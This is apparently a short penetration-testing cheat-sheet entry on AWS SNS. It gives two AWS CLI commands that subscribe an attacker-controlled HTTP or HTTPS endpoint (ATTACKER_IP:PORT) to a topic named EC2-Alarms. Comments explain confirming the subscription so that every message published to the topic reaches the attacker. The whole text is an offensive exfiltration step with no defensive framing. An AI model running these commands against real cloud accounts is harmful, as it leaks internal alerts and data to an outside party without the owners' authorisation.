# -----------------
# Topic: EC2-Alarms
# -----------------
# Subscribe to the topic using an attacker controlled HTTP/HTTPS endpoint

aws --profile $profile --region us-east-1 sns subscribe --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms --protocol http --notification-endpoint http://ATTACKER_IP:PORT
aws --profile $profile --region us-east-1 sns subscribe --topic-arn arn:aws:sns:us-east-1:000000000000:EC2-Alarms --protocol https --notification-endpoint https://ATTACKER_IP:PORT

# NOTE: You will have to confirm the subscription using the URL sent to your attacker controlled http service
# NOTE: Once you have confirmed the subscription, your attacker controlled IP will received all messages published to the topic.
